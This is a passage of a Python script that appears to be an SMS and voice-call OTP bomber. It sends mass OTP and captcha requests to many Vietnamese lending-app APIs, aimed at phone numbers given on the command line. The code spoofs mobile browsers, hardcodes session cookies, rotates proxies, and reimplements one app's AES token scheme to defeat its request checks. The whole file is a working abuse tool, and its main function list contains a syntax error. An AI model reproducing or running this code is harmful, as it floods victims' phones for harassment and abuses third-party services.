        "origin": "https://lk.vayxanh.com",
        "referer": f"https://lk.vayxanh.com/?phone={phone_otp}&amount=2000000&term=7",
        "user-agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 18_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148",
        "x-request-id": str(uuid.uuid4()),
    }
    try:
        async with httpx.AsyncClient(timeout=10) as client:
            resp_get = await client.get(
                "https://lk.vayxanh.com/",
                params={"phone": phone_otp, "amount": "2000000", "term": "7",
                        "utm_source": "direct_vayxanh", "utm_medium": "organic",
                        "utm_campaign": "direct_vayxanh", "utm_content": "mainpage_submit"},
                headers=headers_get,
            )
            r = await client.post(
                "https://lk.vayxanh.com/api/4/client/otp/send",
                headers=headers_post,
                json={"data": {"phone": phone_otp, "code": "resend", "channel": "ivr"}},
            )
        print(f"📡 Status Call9 : {r.status_code}")
        return r.status_code == 200
    except:
        return False

async def call(phone_otp):
    headers = build_headers("https://ios-h5.onsenhoivanvn.com")
    payload = {
        "country_code": "vi",
        "phone": phone_otp,
        "app_name": "Hoi Van Cash",
        "app_package_name": "onse.hoivan.vn",
        "platform": "ios",
    }
    async with BrowserSession(impersonate=_BROWSER, timeout=20) as client:
        res1 = await client.post(
            "https://vnoii.onsenhoivanvn.com/v2/login/captcha",
            json={**payload, "app_id": "247000001"},
            headers=headers,
        )

async def calll(phone_otp):
    headers = build_headers("https://ios-h5.onsenhoivanvn.com")
    payload = {
        "country_code": "vi",
        "phone": phone_otp,
        "app_name": "Hoi Van Cash",
        "app_package_name": "onse.hoivan.vn",
        "platform": "ios",
    }
    async with BrowserSession(impersonate=_BROWSER, timeout=20) as client:
        res2 = await client.post(
            "https://vnoai.onsenhoivanvn.com/v2/login/captcha",
            json={**payload, "type": 2, "app_id": "247000000"},
            headers=headers,
        )
    print(f" Status: {res2.status_code} | call")

async def call_senvay(phone_otp, proxy_url):
    KEY   = b"43frgy5fmjf4647f"
    NONCE = b"\x00" * 12

    def enc(plain):
        if isinstance(plain, (dict, list)):
            plain = json.dumps(plain, separators=(",", ":")).encode()
        elif isinstance(plain, str):
            plain = plain.encode()
        ct, tag = AES.new(KEY, AES.MODE_GCM, nonce=NONCE).encrypt_and_digest(plain)
        return base64.b64encode(NONCE + ct + tag).decode()

    def make_token(device_no: str, server_time_ms: int) -> str:
        inner_token = enc(f"{device_no}++1")
        return enc(f"{inner_token}+{server_time_ms}")

    def make_headers(token: str) -> dict:
        return {
            "Accept":          "application/json, text/plain, */*",
            "Content-Type":    "application/json",
            "version":         "1.0.0",
            "countryCode":     "vn",
            "type":            "1060",
            "token":           token,
            "Origin":          "https://senvayvaytien.com",
            "Referer":         "https://senvayvaytien.com/login",
            "User-Agent":      "Mozilla/5.0 (iPhone; CPU iPhone OS 18_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.1 Mobile/15E148 Safari/604.1",
            "Accept-Language": "vi-VN,vi;q=0.9",
        }

    device_no = str(uuid.uuid4())
    proxies   = {"https": proxy_url, "http": proxy_url} if isinstance(proxy_url, str) else proxy_url
    base_url  = "https://senvayvaytien.com/ly03"

    try:
        async with BrowserSession(impersonate=_BROWSER, proxies=proxies, verify=False, timeout=30) as client:

            # ── Bước 1: Sync thời gian với server qua initData ──────────────
            # JS: ServiceTime = Date.now() - server.ffolml
            # Sau đó token_time = Date.now() - ServiceTime = server.ffolml
            init_path  = "/encrypt/k/bla/j"
            init_param = {
                "fndkec": "vn",
                "ffkjno": "1060",
                "fniehh": "1.0.0",
                "falgnk": 1,
                "fajnpo": "",
                "fnjhhd": device_no,
            }
            local_before  = int(time.time() * 1000)
            init_token    = make_token(device_no, local_before)
            init_body     = enc({"param": enc(init_param), "url": enc(init_path)})
            ri = await client.post(
                f"{base_url}{init_path}",
                content=init_body.encode(),
                headers=make_headers(init_token),
            )
            server_time_ms = local_before  # fallback: dùng local time nếu sync thất bại
            if ri.status_code == 200:
                try:
                    init_data = ri.json()
                    result    = init_data.get("result") or {}
                    # ffolml là server timestamp (ms) từ response
                    sv = result.get("ffolml")
                    if sv and isinstance(sv, (int, float)) and sv > 1_000_000_000_000:
                        server_time_ms = int(sv)
                except Exception:
                    pass

            # ── Bước 2: Gửi SMS OTP dùng server_time trong token ─────────────
            sms_path  = "/fm/nkgg/edf"
            # Chuẩn hoá phone: bỏ số 0 đầu nếu có → thêm 840
            # VD: "0971234567" → "840971234567" (không phải "8400971234567")
            phone_fmt = "840" + phone_otp.lstrip("0")
            sms_param = {
                "ffchmk": "vn",
                "fahpgp": "1060",
                "fmland": "1.0.0",
                "fbdcbg": phone_fmt,
                "fpkgam": 2,
                "fojphg": 1,
            }
            sms_token = make_token(device_no, server_time_ms)
            # param trước url (theo thứ tự native app gửi)
            sms_body  = enc({"param": enc(sms_param), "url": enc(sms_path)})
            r = await client.post(
                f"{base_url}{sms_path}",
                content=sms_body.encode(),
                headers=make_headers(sms_token),
            )

        if r.status_code != 200:
            return False, proxy_url, f"HTTP {r.status_code}"
        data = r.json()
        rc   = data.get("returnCode")
        if rc == 200:
            return True, proxy_url, "OK"
        return False, proxy_url, f"returnCode {rc}: {data.get('returnMsg', '')}"

    except Exception as e:
        return False, proxy_url, f"Failed: {e}"

async def call10(phone_otp):
    headers = {
        "Accept": "*/*",
        "Accept-Language": "vi-VN,vi;q=0.9",
        "Accept-Encoding": "gzip, deflate, br",
        "x-client-type": "phone",
        "Origin": "https://android.vaycash.net",
        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 18_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148",
        "Referer": "https://android.vaycash.net/",
        "Connection": "keep-alive",
        "Content-Type": "application/json",
        "Cookie": "HWWAFSESID=63f6c7f810288e2923; HWWAFSESTIME=1774426765256; PHPSESSID=7aaeabbc2187eeaf2633fb3b2890f364",
    }
    payload = {
        "country_code": "vi",
        "app_name": "VayCash",
        "app_package_name": "com.vaycash.finance.credit",
        "platform": "ios",
        "app_id": "221000000",
        "phone": phone_otp,
    }
    async with BrowserSession(impersonate=_BROWSER, timeout=20) as client:
        res1 = await client.post(
            "https://api.vaycash.net/v2/login/captcha",
            json={**payload, "type": 1},
            headers=headers,
        )
        res2 = await client.post(
            "https://api.vaycash.net/v2/login/captcha",
            json={**payload, "type": 2},
            headers=headers,
        )
    print(f" Status: {res2.status_code} | call 10")

async def call11(phone_otp):
    headers = build_headers("https://ios-h5.kasikvayfinance.com")
    payload = {
        "country_code": "vi",
        "phone": phone_otp,
        "app_name": "Kasik Vay",
        "app_package_name": "credit.kasikvay.ssef",
        "platform": "ios",
    }
    async with BrowserSession(impersonate=_BROWSER, timeout=20) as client:
        res1 = await client.post(
            "https://vkfai.kasikvayfinance.com/v2/login/captcha",
            json={**payload, "type": 1, "app_id": "233000000"},
            headers=headers,
        )

async def calll11(phone_otp):
    headers = build_headers("https://ios-h5.kasikvayfinance.com")
    payload = {
        "country_code": "vi",
        "phone": phone_otp,
        "app_name": "Kasik Vay",
        "app_package_name": "credit.kasikvay.ssef",
        "platform": "ios",
    }
    async with BrowserSession(impersonate=_BROWSER, timeout=20) as client:
        res2 = await client.post(
            "https://vkfii.kasikvayfinance.com/v2/login/captcha",
            json={**payload, "type": 2, "app_id": "233000001"},
            headers=headers,
        )
    print(f" Status: {res2.status_code} | call 11")

async def call12(phone_otp):
    headers = {
        "Accept": "application/json, text/plain, */*",
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Linux; Android 13; Pixel 6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
        "X-Device-Id": str(uuid.uuid4()),
        "x-client-type": "phone",
    }
    payload = {
        "phone": phone_otp,
        "platform": "ios",
        "app_name": "Mitsui Vay",
    }
    async with BrowserSession(impersonate=_BROWSER, timeout=20) as client:
        res1 = await client.post(
            "http://vishi.sumhanoivn.com/v2/login/captcha",
            json={**payload, "type": 2, "app_id": "231000001"},
            headers=headers,
        )
    print(f" Status: {res1.status_code} | call 12")

async def calll12(phone_otp):
    headers = {
        "Accept": "application/json, text/plain, */*",
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Linux; Android 13; Pixel 6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
        "X-Device-Id": str(uuid.uuid4()),
        "x-client-type": "phone",
    }
    payload = {
        "phone": phone_otp,
        "platform": "ios",
        "app_name": "Mitsui Vay",
    }
    async with BrowserSession(impersonate=_BROWSER, timeout=20) as client:
        res2 = await client.post(
            "http://vashi.sumhanoivn.com/v2/login/captcha",
            json={**payload, "app_id": "231000000"},
            headers=headers,
        )
    print(f" Status: {res2.status_code} | call 12")

async def call10ok(phone_otp):
    headers1 = build_headers("https://vn-android-topqcash-net.pages.dev")
    payload1 = {
        "country_code": "vi",
        "phone": phone_otp,
        "app_name": "QCash",
        "type": 2,
        "app_package_name": "business.qcash.hbuy",
        "platform": "android",
        "app_id": "227000000",
    }
    async with BrowserSession(impersonate=_BROWSER, timeout=20) as client:
        r1 = await client.post(
            "https://vatqi.topqcash.net/v2/login/captcha",
            json=payload1,
            headers=headers1
        )
    print("r1 status:", r1.status_code)

async def calll10ok(phone_otp):
    headers2 = build_headers("https://iosweb.topqcash.net/#/login")
    payload2 = {
        "country_code": "vi",
        "phone": phone_otp,
        "app_name": "QCash",
        "app_package_name": "business.qcash.hbuy",
        "type": 2,
        "platform": "ios",
        "app_id": "227000001",
    }
    async with BrowserSession(impersonate=_BROWSER, timeout=20) as client:
        r2 = await client.post(
            "https://vitqi.topqcash.net/v2/login/captcha",
            headers=headers2,
            json=payload2
        )
    print("r2 status:", r2.status_code)

async def call11ok(phone_otp):
    headers = build_headers("https://android.umoneynv.net")
    payload = {
        "country_code": "vi",
        "phone": phone_otp,
        "app_name": "U Money",
        "app_package_name": "com.u.money.cash.loan.credit",
        "platform": "android",
        "download": "https://dzqjvjgi3bn5t.cloudfront.net/UMoney.apk"
    }
    async with BrowserSession(impersonate=_BROWSER, timeout=20) as client:
        res1 = await client.post(
            "https://api.umoneynv.net/v2/login/captcha",
            json={**payload, "type": 2, "app_id": "2700000000"},
            headers=headers,
        )
    print(f" Status: {res1.status_code} | call 11ok")

async def calll11ok(phone_otp):
    headers = build_headers("https://android.umoneynv.net")
    payload = {
        "country_code": "vi",
        "phone": phone_otp,
        "app_name": "U Money",
        "app_package_name": "com.u.money.cash.loan.credit",
        "platform": "android",
        "download": "https://dzqjvjgi3bn5t.cloudfront.net/UMoney.apk"
    }
    async with BrowserSession(impersonate=_BROWSER, timeout=20) as client:
        res2 = await client.post(
            "http://h5api.umoneynv.net/v2/login/captcha",
            json={**payload, "type": 2, "app_id": "2700000001"},
            headers=headers,
        )
    print(f" Status: {res2.status_code} | call 11ok")

async def call12ok(phone_otp):
    headers = build_headers("https://android-h5.truongtaionline.com")
    payload = {
        "country_code": "vi",
        "phone": phone_otp,
        "app_name": "Truong Tai Money",
        "app_package_name": "truong.tai.phat.online",
        "platform": "android",
        "app_id": "242000000",
    }
    async with BrowserSession(impersonate=_BROWSER, timeout=20) as client:
        res1 = await client.post(
            "https://vgtai.truongtaionline.com/v2/login/captcha",
            json={**payload, "type": 1},
            headers=headers,
        )
        res2 = await client.post(
            "https://vgtai.truongtaionline.com/v2/login/captcha",
            json={**payload, "type": 2},
            headers=headers,
        )
    print(f" Status: {res2.status_code} | call 12ok")

async def call13ok(phone_otp):
    headers = build_headers("https://android-h5.dhloantrading.com")
    payload = {
        "country_code": "vi",
        "phone": phone_otp,
        "app_name": "DH Loan",
        "app_package_name": "com.dhloan.trading.vaynhanh",
        "platform": "android",
    }
    async with BrowserSession(impersonate=_BROWSER, timeout=20) as client:
        res1 = await client.post(
            "https://dtaiv.dhloantrading.com/v2/login/captcha",
            json={**payload, "type": 2, "app_id": "243000000"},
            headers=headers,
        )
        res2 = await client.post(
            "https://dtiiv.dhloantrading.com/v2/login/captcha",
            json={**payload, "type": 2, "app_id": "243000001"},
            headers=headers,
        )
    print(f" Status: {res2.status_code} | call 13ok")


async def call28(phone_otp):
    headers = {
        "Accept": "application/json, text/plain, */*",
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Linux; Android 13; Pixel 6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
        "X-Device-Id": str(uuid.uuid4()),
        "x-client-type": "phone",
    }
    payload = {
        "phone": phone_otp,
        "platform": "android",
        "app_name": "Bon Money",
    }
    async with BrowserSession(impersonate=_BROWSER, timeout=20) as client:
        res1 = await client.post(
            "https://bmvai.bonmoneydile.com/v2/login/captcha",
            json={**payload, "type": 2, "app_id": "260000000"},
            headers=headers,
        )

async def calll28(phone_otp):
    headers = {
        "Accept": "application/json, text/plain, */*",
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Linux; Android 13; Pixel 6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
        "X-Device-Id": str(uuid.uuid4()),
        "x-client-type": "phone",
    }
    payload = {
        "phone": phone_otp,
        "platform": "android",
        "app_name": "Bon Money",
    }
    async with BrowserSession(impersonate=_BROWSER, timeout=20) as client:
        res2 = await client.post(
            "https://bmvii.bonmoneydile.com/v2/login/captcha",
            json={**payload, "type": 2, "app_id": "260000001"},
            headers=headers,
        )
    print(f" Status: {res2.status_code} | call 28")


async def call14ok(phone_otp):
    headers = build_headers("https://android-h5.microfinmobile.com")
    payload = {
        "country_code": "vi",
        "phone": phone_otp,
        "app_name": "Microfin Mobile",
        "app_package_name": "microfin.moblie.thpay",
        "platform": "android",
        "app_id": "239000000",
    }
    async with BrowserSession(impersonate=_BROWSER, timeout=20) as client:
        res1 = await client.post(
            "https://mbaiv.microfinmobile.com/v2/login/captcha",
            json=payload,
            headers=headers,
        )

async def calll14ok(phone_otp):
    headers = build_headers("https://android-h5.microfinmobile.com")
    payload = {
        "country_code": "vi",
        "phone": phone_otp,
        "app_name": "Microfin Mobile",
        "app_package_name": "microfin.moblie.thpay",
        "platform": "android",
        "app_id": "239000000",
    }
    async with BrowserSession(impersonate=_BROWSER, timeout=20) as client:
        res2 = await client.post(
            "https://mbaiv.microfinmobile.com/v2/login/captcha",
            json={**payload, "type": 2},
            headers=headers,
        )
    print(f" Status: {res2.status_code} | call 14")


async def call17(phone_otp):
    headers = build_headers("https://vn-ios-h5-sunmobile.pages.dev")
    payload = {
        "country_code": "vi",
        "phone": phone_otp,
        "app_name": "Sun Mobile",
        "app_package_name": "sunvay.online",
        "platform": "ios",
        "app_id": "238000001",
    }
    async with BrowserSession(impersonate=_BROWSER, timeout=20) as client:
        res1 = await client.post(
            "https://sciiv.sunmobilefinance.com/v2/login/captcha",
            json=payload,
            headers=headers,
        )

async def calll17(phone_otp):
    headers = build_headers("https://vn-android-h5-sunmobile.pages.dev")
    payload = {
        "country_code": "vi",
        "phone": phone_otp,
        "app_name": "Sun Mobile",
        "app_package_name": "sunvay.online",
        "platform": "android",
        "app_id": "238000000",
    }
    async with BrowserSession(impersonate=_BROWSER, timeout=20) as client:
        res2 = await client.post(
            "https://scaiv.sunmobilefinance.com/v2/login/captcha",
            json={**payload, "type": 2},
            headers=headers,
        )
    print(f" Status: {res2.status_code} | call 17")

async def call18(phone_otp):
    headers = build_headers("https://vn-android-gbcreditvn-net.pages.dev")
    payload = {
        "country_code": "vi",
        "phone": phone_otp,
        "app_name": "GbCredit",
        "app_package_name": "com.gbcredit.money.cash",
        "platform": "android",
        "app_id": "2900000000",
        "download": "https://dzqjvjgi3bn5t.cloudfront.net/GbCredit.apk"
    }
    async with BrowserSession(impersonate=_BROWSER, timeout=20) as client:
        res1 = await client.post(
            "https://api.gbcreditvn.net/v2/login/captcha",
            json=payload,
            headers=headers,
        )

async def calll18(phone_otp):
    headers = build_headers("https://vn-android-gbcreditvn-net.pages.dev")
    payload = {
        "country_code": "vi",
        "phone": phone_otp,
        "app_name": "GbCredit",
        "app_package_name": "com.gbcredit.money.cash",
        "platform": "android",
        "app_id": "2900000000",
        "download": "https://dzqjvjgi3bn5t.cloudfront.net/GbCredit.apk"
    }
    async with BrowserSession(impersonate=_BROWSER, timeout=20) as client:
        res2 = await client.post(
            "https://api.gbcreditvn.net/v2/login/captcha",
            json={**payload, "type": 2},
            headers=headers,
        )
    print(f" Status: {res2.status_code} | call 18")

async def call19(phone_otp):
    headers = build_headers("https://bsawv.subkamolplus.com")
    payload = {"phone": phone_otp, "country_code": "vi", "app_name": "Subkamol Lending", "app_package_name": "com.subkamol.lending.sofn", "platform": "android", "app_id": "244000000"}
    async with BrowserSession(impersonate=_BROWSER, timeout=20) as client:
        res1 = await client.post(
        "https://bsaiv.subkamolplus.com/v2/login/captcha", 
        json=payload, 
        headers=headers
        )

async def calll19(phone_otp):
    headers = build_headers("https://bsawv.subkamolplus.com")
    payload = {"phone": phone_otp, "country_code": "vi", "app_name": "Subkamol Lending", "app_package_name": "com.subkamol.lending.sofn", "platform": "android", "app_id": "244000000", "type": 2}
    async with BrowserSession(impersonate=_BROWSER, timeout=20) as client:
        res2 = await client.post(
        "https://bsaiv.subkamolplus.com/v2/login/captcha", 
        json=payload, 
        headers=headers
        )

    print(f" Status: {res2.status_code} | call 19")

async def call21(phone_otp):
    headers = build_headers("https://vn-android-h5-nathco-vay.pages.dev")
    payload = {
        "country_code": "vn",
        "phone": phone_otp,
        "app_name": "Nathco Vay",
        "app_package_name": "com.artmis.dong.vn",
        "platform": "android",
    }
    async with BrowserSession(impersonate=_BROWSER, timeout=20) as client:
        res1 = await client.post(
            "https://oyvai.nathcopay.com/v2/login/captcha",
            json={**payload, "app_id": "235000000"},
            headers=headers,
        )

async def calll21(phone_otp):
    headers = build_headers("https://vn-android-h5-nathco-vay.pages.dev")
    payload = {
        "country_code": "vn",
        "phone": phone_otp,
        "app_name": "Nathco Vay",
        "app_package_name": "com.artmis.dong.vn",
        "platform": "android",
    }
    async with BrowserSession(impersonate=_BROWSER, timeout=20) as client:
        res2 = await client.post(
            "https://oyvii.nathcopay.com/v2/login/captcha",
            json={**payload, "type": 2, "app_id": "235000001"},
            headers=headers,
        )
    print(f" Status: {res2.status_code} | call 21")

async def call22(phone_otp):
    headers = {
        "Accept": "application/json, text/plain, */*",
        "Accept-Language": "vi-VN,vi;q=0.9",
        "Accept-Encoding": "gzip, deflate, br",
        "x-client-type": "phone",
        "Origin": "https://android.vaycash.net",
        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 18_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148",
        "Referer": "https://android.vaycash.net/",
        "Connection": "keep-alive",
        "Content-Type": "application/json",
        "Cookie": "HWWAFSESID=63f6c7f810288e2923; HWWAFSESTIME=1774426765256; PHPSESSID=7aaeabbc2187eeaf2633fb3b2890f364",
    }
    payload = {
        "country_code": "vi",
        "app_name": "VayCash",
        "app_package_name": "com.vaycash.finance.credit",
        "platform": "ios",
        "app_id": "221000001",
        "phone": phone_otp,
    }
    async with BrowserSession(impersonate=_BROWSER, timeout=20) as client:
        res1 = await client.post(
        "https://notice.vaycash.net/v2/login/captcha",
        json=payload,
        headers=headers,
    )
    print(f" Status: {res1.status_code} | call 22")

async def calll22(phone_otp):
    headers = build_headers("http://d3pnx0g52v0o6y.cloudfront.net")
    payload = {
        "country_code": "vi",
        "phone": phone_otp,
        "app_name": "OKCredit",
        "app_package_name": "com.OKCredit.loan.cash",
        "platform": "android",
        "app_id": "2100000000",
        "download": "https://dzqjvjgi3bn5t.cloudfront.net/OKCredit.apk"
    }
    async with BrowserSession(impersonate=_BROWSER, timeout=20) as client:
        res2 = await client.post(
            "https://api.getokcredit.net/v2/login/captcha",
            json={**payload, "type": 2},
            headers=headers,
        )
    print(f" Status: {res2.status_code} | call 22")


def _make_android_ua_headers() -> Dict[str, str]:
    return {
        "Accept": "application/json, text/plain, */*",
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Linux; Android 13; Pixel 6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
        "X-Device-Id": str(uuid.uuid4()),
        "x-client-type": "phone",
    }

async def call101(phone_otp):
    headers = {
        "Accept": "application/json, text/plain, */*",
        "Accept-Language": "vi-VN,vi;q=0.9",
        "Accept-Encoding": "gzip, deflate, br",
        "x-client-type": "phone",
        "Origin": "https://android.vaycash.net",
        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 18_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148",
        "Referer": "https://android.vaycash.net/",
        "Connection": "keep-alive",
        "Content-Type": "application/json",
        "Cookie": "HWWAFSESID=63f6c7f810288e2923; HWWAFSESTIME=1774426765256; PHPSESSID=7aaeabbc2187eeaf2633fb3b2890f364",
    }
    payload = {
        "country_code": "vi",
        "app_name": "VayCash",
        "app_package_name": "com.vaycash.finance.credit",
        "platform": "ios",
        "app_id": "221000001",
        "phone": phone_otp,
    }
    async with BrowserSession(impersonate=_BROWSER, timeout=20) as client:
        res2 = await client.post(
            "https://notice.vaycash.net/v2/login/captcha",
            json=payload,
            headers=headers,
        )
    print(f" Status: {res2.status_code} | call 101")

async def call_subkamol(phone_otp):
    headers = build_headers("https://android-h5.subkamolplus.com")
    payload = {"phone": phone_otp, "country_code": "vi", "app_name": "Subkamol Lending", "app_package_name": "com.subkamol.lending.sofn", "platform": "android", "app_id": "244000000"}
    try:
        async with BrowserSession(impersonate=_BROWSER, timeout=20) as client:
            r = await client.post("https://bsaiv.subkamolplus.com/v2/login/captcha", json=payload, headers=headers)
        print(f" Status: {r.status_code} ")
    except:
        pass

async def calll_subkamol(phone_otp):
    headers = build_headers("https://android-h5.subkamolplus.com")
    payload = {"phone": phone_otp, "country_code": "vi", "app_name": "Subkamol Lending", "app_package_name": "com.subkamol.lending.sofn", "platform": "android", "app_id": "244000001"}
    try:
        async with BrowserSession(impersonate=_BROWSER, timeout=20) as client:
            r = await client.post("https://bsiiv.subkamolplus.com/v2/login/captcha", json=payload, headers=headers)
        print(f" Status: {r.status_code} ")
    except:
        pass

async def call_mydong(phone_otp):
    headers = build_headers("https://android.mydonny.net/")
    payload = {"phone": phone_otp, "country_code": "vi", "app_name": "Mydong", "app_package_name": "com.mydong.credit.money", "platform": "android", "app_id": "2400000000", "download": "https://dzqjvjgi3bn5t.cloudfront.net/Mydong.apk"}
    try:
        async with BrowserSession(impersonate=_BROWSER, timeout=20) as client:
            r = await client.post("https://notice.mydonny.net/v2/login/captcha", json=payload, headers=headers)
        print(f" Status: {r.status_code} ")
    except:
        pass

async def calll_mydong(phone_otp):
    headers = build_headers("https://android.mydonny.net/")
    payload = {"phone": phone_otp, "country_code": "vi", "app_name": "Mydong", "app_package_name": "com.mydong.credit.money", "platform": "android", "app_id": "2400000000", "download": "https://dzqjvjgi3bn5t.cloudfront.net/Mydong.apk"}
    try:
        async with BrowserSession(impersonate=_BROWSER, timeout=20) as client:
            r = await client.post("https://api.mydonny.net/v2/login/captcha", json=payload, headers=headers)
        print(f" Status: {r.status_code} ")
    except:
        pass

def run_all_round_robin(sync_funcs, proxy_funcs, phone_otps, proxies, workers=100, batch=200, target=2):
    def make_proxy_wrapper(fn):
        def wrapper(phone_otp):
            loop = asyncio.new_event_loop()
            try:
                loop.run_until_complete(
                    run_proxy_async(fn, phone_otp, proxies, workers=workers, batch=batch, target=target)
                )
            finally:
                loop.close()
        wrapper.__name__ = fn.__name__ + "_proxy"
        return wrapper
    all_funcs = sync_funcs + [make_proxy_wrapper(f) for f in proxy_funcs]
    total = len(phone_otps)
    for f_idx, func in enumerate(all_funcs, 1):
        fname = func.__name__
        for p_idx, phone_otp in enumerate(phone_otps, 1):
            try:
                func(phone_otp)
            except Exception as e:
                print(f"  [!] {fname}({phone_otp}) lỗi: {e}")

def load_proxies():
    if not os.path.exists("proxy.txt"):
        return []
    proxies = []
    with open("proxy.txt", 'r') as f:
        for line in f:
            line = line.strip()
            if not line or line.startswith('#'):
                continue
            if '://' in line:
                proxies.append(line)
            elif line.count(':') == 3:
                host, port, user, passwd = line.split(':')
                proxies.append(f"http://{user}:{passwd}@{host}:{port}")
            elif line.count(':') == 1:
                proxies.append(f"http://{line}")
    return proxies

async def run_proxy_async(fn, phone_otp, proxies, workers=100, batch=200, target=2):
    sample = random.sample(list(proxies), min(batch, len(proxies)))
    sem = asyncio.Semaphore(workers)
    success = 0
    stop_event = asyncio.Event()

    async def _try(proxy_url):
        if stop_event.is_set():
            return False, proxy_url, "Stopped"
        async with sem:
            if stop_event.is_set():
                return False, proxy_url, "Stopped"
            return await fn(phone_otp, proxy_url)
    tasks = [asyncio.create_task(_try(p)) for p in sample]
    try:
        for coro in asyncio.as_completed(tasks):
            try:
                ok, proxy, msg = await coro
            except asyncio.CancelledError:
                continue
            except Exception:
                continue
            if ok:
                success += 1
                print(f"[✅ Success #{success} via {proxy} | {msg}")
            if success >= target:
                stop_event.set()
                for t in tasks:
                    if not t.done():
                        t.cancel()
                break
    finally:
        await asyncio.gather(*tasks, return_exceptions=True)
        tasks.clear()
        gc.collect()
    return success

async def main():
    phone_otps = sys.argv[1:11]
    if not phone_otps:
        print("Usage: python pro.py <phone_otp1> [phone_otp2] ...")
        sys.exit(1)
    proxies = load_proxies()
    proxy_sleep = max(1, 11 - 1 * len(phone_otps))

    def proxy(fn):
        async def wrapper(phone_otp):
            await run_proxy_async(fn, phone_otp, proxies, workers=100, batch=200, target=2)
        wrapper.__name__ = fn.__name__
        return wrapper

    all_funcs = [
        # (vncredit_sms,     0),
        # (call_vaydep365,   10),        
        # (qq_sms,           10),
        # (call_mfast360,    10),
        # (proxy(vuiapp),    proxy_sleep),        
        # (calll20,          10),
        # (mfast,            0),
          (call101,          0,        
        # (call3,            0),
        # (call10ok,         10),
        # (ptvay_sms,        10),        
        # (proxy(call_senvay), proxy_sleep),        
        # (call,             0),
        # (vncredit_voice,   10),        
        # (combo2,           10),        
        # (mfast1,           10),
        # (calll18,          10),
        # (call1,            10),
        # (combo1,           10), 
        # (call14ok,         10),
        (achau_sms,        10),
        # (calll11ok,        10),
        # (petro_sms,        10),        
        # (call_mydong,      10),
        # (calll_mydong,     10),        
        # (lavi_sms,         10),        
        # (call28,           10),
        # (proxy(vuiapp1),   proxy_sleep),        
        # (call8,            10),
        # (call9,            10),
        # (call11,           10),
        # (call12,           10),
        # (random_site,       0),   
        # (calll,             0),
        # (calll12,          10),
        # (calll_mydong,     10),
        # (call14ok,         10),
        # (call10,           10),
        # (call_subkamol,    10),        
        # (calll11,          10),
        # (call11ok,         10),
        # (call18,           10),
        # (call12ok,         10),
        # (calll28,          10),
        # (call13ok,         10),
        # (calll14ok,        10),
        # (call17,           10),
        # (proxy(vuiapp2),   proxy_sleep),
        # (calll22,          10),
        # (calll19,          10),
        # (call19,           10),
        # (calll17,          10),
        # (call21,           10),
        # (calll10ok,        10),
        # (call22,           10),
        # (calll_subkamol,   10),
    ]
    async def safe_call(func, phone_otp):
        try:
            await func(phone_otp)
        except:
            pass

    for f_idx, (func, sleep_time) in enumerate(all_funcs, 1):
        await asyncio.gather(*[safe_call(func, phone_otp) for phone_otp in phone_otps])
        if f_idx < len(all_funcs):
            await asyncio.sleep(random.uniform(sleep_time, sleep_time + 3) if sleep_time > 0 else 0)

if __name__ == "__main__":
    asyncio.run(main())
